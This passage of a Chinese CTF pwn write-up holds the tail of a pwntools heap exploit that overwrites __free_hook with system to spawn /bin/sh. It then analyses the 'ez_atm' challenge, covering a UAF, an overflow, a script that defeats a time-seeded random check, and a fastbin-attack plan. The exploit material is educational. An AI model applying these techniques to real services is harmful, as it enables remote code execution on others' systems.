class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">idx</span>):</span></span><br><span class="line">    cmd(<span class="string">&#x27;decrypt#&#x27;</span>+<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">2022</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2021</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;2&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2020</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;3&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2019</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;4&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2018</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;5&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2017</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;6&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">2016</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;7&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">heap_base = leak_addr - <span class="number">0x14390</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1802</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1801</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;2&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1800</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;3&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1809</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;4&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1808</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;5&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1807</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;6&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1806</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;7&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1805</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;8&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1804</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;9&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">3</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) </span><br><span class="line">libc_base = leak_addr - <span class="number">0x1ecbe0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc.sym[<span class="string">&quot;__free_hook&quot;</span>] + libc_base</span><br><span class="line">system_libc = libc.sym[<span class="string">&quot;system&quot;</span>] + libc_base</span><br><span class="line">one_gadgets = [<span class="number">0xe3afe</span>,<span class="number">0xe3b01</span>,<span class="number">0xe3b04</span>]</span><br><span class="line">one_gadget = one_gadgets[<span class="number">2</span>] + libc_base</span><br><span class="line">success(<span class="string">&quot;free_hook &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line"></span><br><span class="line">encrypt(<span class="number">0</span>,<span class="number">4</span>,<span class="number">0x8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;    &quot;</span>)</span><br><span class="line">leak_data = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) </span><br><span class="line">success(<span class="string">&quot;leak_data &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_data))</span><br><span class="line">random_key = leak_data ^ <span class="number">0x3232323232323232</span></span><br><span class="line">success(<span class="string">&quot;random_key &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(random_key))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1701</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;1&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line">add(<span class="number">1702</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;2&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1703</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;3&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1704</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;4&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1705</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;5&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1706</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;6&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1707</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;7&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1708</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;8&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1709</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;9&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">add(<span class="number">1710</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;0&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = <span class="number">0x14770</span> + heap_base</span><br><span class="line">add(<span class="number">1711</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x2c0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">encrypt(<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">free_hook_up = u32(p64(free_hook-<span class="number">4</span>-<span class="number">8</span>)[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">free_hook_down = u32(p64(free_hook-<span class="number">4</span>-<span class="number">8</span>)[:<span class="number">4</span>])</span><br><span class="line">success(<span class="string">&quot;free_hook_up &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook_up))</span><br><span class="line">success(<span class="string">&quot;free_hook_down &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(free_hook_down))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&quot;c&quot;</span>*(<span class="number">0x2f0</span>-<span class="number">4</span>)+p64(free_hook_down))</span><br><span class="line">edit(<span class="number">2</span>,p32(free_hook_up))</span><br><span class="line">decrypt(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1712</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">4</span>+p64(heap_base))</span><br><span class="line">add(<span class="number">1713</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;;/bin/sh&quot;</span>+p64(system_libc))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1713</span>,<span class="number">12</span>,<span class="number">10</span>,<span class="number">10</span>,<span class="number">30</span>,<span class="number">30</span>,<span class="string">b&quot;;/bin/sh;&quot;</span>+p64(system_libc))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="ez-atm"><a href="#ez-atm" class="headerlink" title="ez_atm"></a>ez_atm</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>)</span> stable release version 2.27.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ez_atm: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /home/yhellow/tools/glibc-all-in-one/libs/<span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>_amd64/ld<span class="number">-2.27</span>.so, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=bd8945726574e2b623d0f972a2b9d04bb4fd9e3a, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>本程序分为客户端和服务端，在客户端上有一个后门：（没什么用）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  info(<span class="string">&quot;here I  will give you a f1ag,you win!&quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;/bin/cat flag.txt&quot;</span>);</span><br><span class="line">  close(sockfd);</span><br><span class="line">  _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 <code>cancellation</code> 函数中有一个 UAF：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">5</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( check_password(current_account, &amp;data[<span class="number">16</span>]) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(account_list[current_account]);      <span class="comment">// UAF</span></span><br><span class="line">    current_account = <span class="number">-1</span>;</span><br><span class="line">    toClient(<span class="number">1</span>, <span class="string">&quot;The target account has been cancelled.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i != <span class="number">1</span> )</span><br><span class="line">    toClient(<span class="number">2</span>, <span class="string">&quot;password error.Try again.&quot;</span>);</span><br><span class="line">  receviceline();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 <code>stat_query</code> 函数中调用的 <code>toClient</code> 函数中有溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">toClient</span><span class="params">(<span class="keyword">int</span> num, _QWORD *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 str_tmp; <span class="comment">// rcx MAPDST</span></span><br><span class="line">  __int64 str_tmp2; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;reply :         %s\n&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)str);</span><br><span class="line">  strline = num;</span><br><span class="line">  str_tmp = str[<span class="number">1</span>];</span><br><span class="line">  ret_data[<span class="number">0</span>] = *str;</span><br><span class="line">  ret_data[<span class="number">1</span>] = str_tmp;</span><br><span class="line">  str_tmp = str[<span class="number">3</span>];</span><br><span class="line">  ret_data[<span class="number">2</span>] = str[<span class="number">2</span>];</span><br><span class="line">  ret_data[<span class="number">3</span>] = str_tmp;</span><br><span class="line">  str_tmp = str[<span class="number">5</span>];</span><br><span class="line">  ret_data[<span class="number">4</span>] = str[<span class="number">4</span>];</span><br><span class="line">  ret_data[<span class="number">5</span>] = str_tmp;</span><br><span class="line">  str_tmp = str[<span class="number">7</span>];</span><br><span class="line">  ret_data[<span class="number">6</span>] = str[<span class="number">6</span>];</span><br><span class="line">  ret_data[<span class="number">7</span>] = str_tmp;</span><br><span class="line">  str_tmp = str[<span class="number">9</span>];</span><br><span class="line">  ret_data[<span class="number">8</span>] = str[<span class="number">8</span>];</span><br><span class="line">  ret_data[<span class="number">9</span>] = str_tmp;</span><br><span class="line">  str_tmp = str[<span class="number">11</span>];</span><br><span class="line">  ret_data[<span class="number">10</span>] = str[<span class="number">10</span>];</span><br><span class="line">  ret_data[<span class="number">11</span>] = str_tmp;</span><br><span class="line">  str_tmp = str[<span class="number">13</span>];</span><br><span class="line">  ret_data[<span class="number">12</span>] = str[<span class="number">12</span>];</span><br><span class="line">  ret_data[<span class="number">13</span>] = str_tmp;</span><br><span class="line">  str_tmp2 = str[<span class="number">15</span>];</span><br><span class="line">  ret_data[<span class="number">14</span>] = str[<span class="number">14</span>];</span><br><span class="line">  ret_data[<span class="number">15</span>] = str_tmp2;</span><br><span class="line">  send(fd, &amp;strline, <span class="number">0x84</span>uLL, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memset</span>(&amp;strline, <span class="number">0</span>, <span class="number">0x84</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>本地可以用如下方式运行程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./client <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3339</span></span><br><span class="line">./ez_atm           </span><br></pre></td></tr></table></figure>
<p>比赛时我看了半天也不知道该如何泄露，因为 <code>client</code> 限制了程序的输入，导致程序的溢出利用不了（虽然客户端的 <code>stat_query</code> 有溢出，但是服务端的 <code>client</code> 接收不到）</p>
<p>赛后看别人 wp 才发现可以不通过 <code>client</code> 进行交互，从而摆脱了 <code>client</code> 的限制</p>
<p>先把本地的 docker 环境搭起来：（记得在 <code>bin</code> 目录中添加一个 <code>flag</code> 文件）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t <span class="string">&quot;ez_atm&quot;</span> .</span><br></pre></td></tr></table></figure>
<ul>
<li>启动容器：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p <span class="string">&quot;0.0.0.0:4444:8888&quot;</span> -p <span class="string">&quot;0.0.0.0:7777:3339&quot;</span> -h <span class="string">&quot;ez_atm&quot;</span> --name=<span class="string">&quot;ez_atm&quot;</span> ez_atm</span><br></pre></td></tr></table></figure>
<ul>
<li>然后执行 <code>docker exec -it</code> 连接目标 docker：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 87a8f7705e22 /bin/sh</span><br></pre></td></tr></table></figure>
<ul>
<li>后台运行程序：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp ./ez_atm /</span><br><span class="line">/ez_atm &amp;</span><br></pre></td></tr></table></figure>
<ul>
<li>查看程序的 PID：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ps -aux | grep &quot;ez_atm&quot;</span><br><span class="line">root      185272  0.0  0.0   4396   764 pts/0    S    02:58   0:00 ./ez_atm # 子进程</span><br><span class="line">root      185275  4.0  0.0      0     0 pts/0    Z    03:02   0:04 [ez_atm] &lt;defunct&gt;</span><br><span class="line">root      247050  0.0  0.0   4528    68 pts/0    S    03:02   0:00 ./ez_atm # 父进程</span><br><span class="line">root      247052  0.0  0.0  11472  1104 pts/0    S+   03:03   0:00 grep ez_atm</span><br></pre></td></tr></table></figure>
<ul>
<li>查看容器的 PID：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND       CREATED          STATUS          PORTS                                            NAMES</span><br><span class="line">87a8f7705e22   ez_atm    &quot;/start.sh&quot;   26 minutes ago   Up 26 minutes   0.0.0.0:7777-&gt;3339/tcp, 0.0.0.0:4444-&gt;8888/tcp   ez_atm</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker inspect -f &#x27;&#123;&#123;.State.Pid&#125;&#125;&#x27; 87a8f7705e22</span><br><span class="line">377387</span><br></pre></td></tr></table></figure>
<p>如果我们不使用 <code>client</code> 进行连接，就需要先绕过服务端的随机数检测：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">recv_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+8h] [rbp-38h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  *(_QWORD *)seed = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, <span class="string">&quot;yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy&quot;</span>);</span><br><span class="line">  code(s);</span><br><span class="line">  send(fd, seed, <span class="number">4uLL</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( recv(fd, data, <span class="number">0x1E</span>uLL, <span class="number">0</span>) &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error &quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(s, data, <span class="number">0x1E</span>uLL) )</span><br><span class="line">  &#123;</span><br><span class="line">    toClient(<span class="number">0</span>, <span class="string">&quot;1111&quot;</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  toClient(<span class="number">1</span>, <span class="string">&quot;success&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>绕过该检测的脚本：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>():</span></span><br><span class="line">    <span class="keyword">from</span> ctypes <span class="keyword">import</span> cdll</span><br><span class="line">    clibc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">getrand</span>():</span></span><br><span class="line">        <span class="keyword">return</span> clibc.rand() % <span class="number">15</span></span><br><span class="line"></span><br><span class="line">    ask_time = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    clibc.srand(ask_time)</span><br><span class="line">    uuid = <span class="built_in">list</span>(<span class="string">&quot;yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(uuid)):</span><br><span class="line">        <span class="keyword">if</span> uuid[i] != <span class="string">&#x27;4&#x27;</span> <span class="keyword">and</span> uuid[i] != <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> uuid[i] == <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">                uuid[i] = <span class="built_in">hex</span>(getrand())[<span class="number">2</span>:]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                uuid[i] = <span class="built_in">hex</span>(getrand() &amp; <span class="number">3</span> | <span class="number">8</span>)[<span class="number">2</span>:]</span><br><span class="line">    uuid = <span class="string">&#x27;&#x27;</span>.join(uuid)</span><br><span class="line">    p.send(uuid)</span><br></pre></td></tr></table></figure>
<p>另外我还看到一种解决办法，就是直接 path 客户端文件 <code>client</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">stat_query</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  send_msg(<span class="string">&quot;stat_query&quot;</span>, <span class="number">10</span>);</span><br><span class="line">  recv_msg();</span><br><span class="line">  <span class="built_in">puts</span>(&amp;msg_rec.msg_info[<span class="number">24</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffc9b86aa00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rax rsi <span class="number">0x7ffc9b86aa00</span> ◂— <span class="number">0x2</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7ffc9b86aa08</span> ◂— <span class="number">0xfd7bd20ea9bd5400</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7ffc9b86aa10</span> —▸ <span class="number">0x55959cc02130</span> ◂— push r15</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7ffc9b86aa18</span> —▸ <span class="number">0x7f4fc5e01c87</span> (__libc_start_main+<span class="number">231</span>) ◂— mov edi, eax</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7ffc9b86aa20</span> ◂— <span class="number">0x1</span></span><br></pre></td></tr></table></figure>
<p>获取到 <code>libc_base</code> 后，就直接把它写入 <code>fastbin</code> 中，然打 <code>fastbin attack</code> 就好了（最后执行 <code>system(cat flag &gt;&amp;4)</code>）</p>
